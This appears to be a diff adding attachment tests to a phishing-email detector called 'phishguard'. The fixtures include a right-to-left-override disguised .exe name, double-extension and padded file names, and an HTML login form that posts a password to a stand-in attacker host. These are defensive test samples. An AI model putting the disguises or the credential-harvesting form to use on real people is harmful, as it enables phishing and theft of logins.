@@ -49,3 +49,49 @@ def test_genuine_brand_senders_not_flagged():
                    '"Pineapple Deals" <hi@pineapple-deals.com>', '"Sam" <sam@example.com>']:
         r = analyze_email(_eml(sender), url_scorer=fake_scorer)
         assert not any("imitates" in f or "claims to be" in f for f in r.header_flags), (sender, r.header_flags)
+
+
+# ---- attachments ----
+from email.message import EmailMessage
+
+from phishguard.email_analyzer import inspect_attachment
+
+
+def _with_attachment(name, data, subtype="octet-stream"):
+    m = EmailMessage()
+    m["From"] = "Sam <sam@example.com>"
+    m["To"] = "you@example.com"
+    m["Subject"] = "Invoice"
+    m.set_content("Please see attached.")
+    m.add_attachment(data, maintype="application" if subtype == "octet-stream" else "text",
+                     subtype=subtype, filename=name) if isinstance(data, bytes) and subtype == "octet-stream" \
+        else m.add_attachment(data.decode(), subtype=subtype, filename=name)
+    return m.as_bytes()
+
+
+def test_rtlo_disguise():
+    flags, score = inspect_attachment("invoice\u202efdp.exe", b"MZ")
+    assert score >= 0.8 and "Hidden text-direction" in flags[0]
+
+
+def test_double_extension_and_padding():
+    assert inspect_attachment("scan.jpg.scr", b"")[1] >= 0.6
+    assert inspect_attachment("report.pdf          .exe", b"")[1] >= 0.6
+
+
+def test_html_login_form_attachment():
+    html = b'<html><form action="https://evil.xyz/c"><input type="password" name="p"></form></html>'
+    flags, score = inspect_attachment("Secure_Message.html", html)
+    assert score >= 0.75 and any("login form" in f for f in flags)
+    assert inspect_attachment("newsletter.html", b"<html><p>Hello</p></html>")[1] == 0.4
+
+
+def test_benign_attachment_not_flagged():
+    assert inspect_attachment("minutes.pdf", b"%PDF") == ([], 0.0)
+
+
+def test_email_with_html_phishing_attachment_scores_high():
+    raw = _with_attachment("Voicemail.html", b'<input type="password"><script>fetch("x")</script>', "html")
+    r = analyze_email(raw, url_scorer=fake_scorer)
+    assert r.components["attachments"] >= 0.75
+    assert any("login form" in f for f in r.content_flags)
